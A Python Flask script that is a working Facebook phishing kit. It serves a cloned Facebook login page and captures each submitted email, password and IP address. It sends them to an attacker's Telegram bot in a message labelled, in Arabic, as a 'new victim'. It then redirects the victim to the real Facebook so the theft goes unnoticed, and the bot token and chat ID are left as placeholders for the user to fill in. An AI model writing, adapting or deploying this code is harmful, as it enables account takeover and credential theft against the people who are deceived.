from flask import Flask, request, render_template_string
import requests, datetime

app = Flask(__name__)

BOT_TOKEN = 'غير_هنا_بـ_TOKEN_البوت'
CHAT_ID = 'غير_هنا_بـ_CHAT_ID'

def send(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      data={'chat_id': CHAT_ID, 'text': msg, 'parse_mode': 'Markdown'})
    except: pass

HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#f5f6f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#1c1e21}
        .ad{background:white;padding:12px;text-align:center;font-size:13px;color:#1877f2;border-bottom:1px solid #ddd}
        .ad a{color:#1877f2;text-decoration:none}
        .lang{text-align:center;padding:10px;font-size:13px;color:#8a8d91}
        .container{max-width:360px;margin:20px auto;padding:0 16px}
        .logo{text-align:center;margin:30px 0}
        .logo img{width:80px}
        form{background:white;padding:16px;border-radius:8px;box-shadow:0 1px 2px rgba(0,0,0,.1)}
        input{width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px}
        button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:17px;font-weight:600;margin:10px 0}
        .forgot,.create{text-align:center;margin:15px 0}
        .forgot a,.create a{color:#1877f2;text-decoration:none;font-size:14px;font-weight:600}
        .create a{display:inline-block;padding:10px 20px;border:1px solid #1877f2;border-radius:6px}
        .meta{text-align:center;margin:30px 0;color:#8a8d91;font-size:12px}
    </style>
</head>
<body>
    <div class="ad"><a href="#">Get Facebook for Android and browse faster.</a></div>
    <div class="lang">English (UK)</div>
    <div class="container">
        <div class="logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lUysooF4zD.svg" alt="f"></div>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Mobile number or email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button>Log in</button>
        </form>
        <div class="forgot"><a href="#">Forgotten password?</a></div>
        <div class="create"><a href="#">Create new account</a></div>
        <div class="meta">∞ Meta</div>
    </div>
</body>
</html>
'''

@app.route('/')
def home(): return render_template_string(HTML)

@app.route('/login', methods=['POST'])
def login():
    e = request.form.get('email','')
    p = request.form.get('password','')
    i = request.remote_addr
    t = datetime.datetime.now().strftime("%H:%M")
    msg = f"**ضحية جديدة!**\n**البريد**: `{e}`\n**كلمة السر**: `{p}`\n**IP**: `{i}`\n**الوقت**: `{t}`"
    send(msg)
    return '<script>setTimeout(()=>{location="https://m.facebook.com"},1000)</script><div style="text-align:center;padding:50px">Logging in...</div>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
